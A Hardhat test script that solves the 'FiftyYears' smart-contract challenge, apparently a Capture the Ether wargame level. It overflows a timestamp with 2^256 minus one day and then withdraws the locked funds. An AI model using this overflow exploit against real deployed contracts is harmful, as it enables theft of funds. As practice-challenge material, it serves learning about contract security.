const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = "0x195FeCeEcA367A6f7fd5b7f4AED3ab0C7ae21fE0";

before(async () => {
  accounts = await ethers.getSigners();
  player = accounts[0];
});

it.only("FiftyYears", async function () {
  const chFactory = await ethers.getContractFactory("FiftyYearsChallenge");
  contract = await chFactory.attach(CHALLENGE_ADDRESS);

  timestamp = ethers.BigNumber.from(2)
    .pow(256)
    .sub(24 * 60 * 60);
  tx = await contract.upsert(1, timestamp, { value: 1, gasLimit: 6e6 });
  console.log("first upsert tx intitiated");
  await tx.wait();
  console.log("first upsert tx completed");

  tx = await contract.upsert(1, 0, { value: 1, gasLimit: 6e6 });
  console.log("second upsert tx intitiated");
  await tx.wait();
  console.log("second upsert tx completed");

  tx = await contract.withdraw(1, { gasLimit: 6e6 });
  console.log("withdraw tx intitiated");
  await tx.wait();
  console.log("withdraw tx completed");

  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
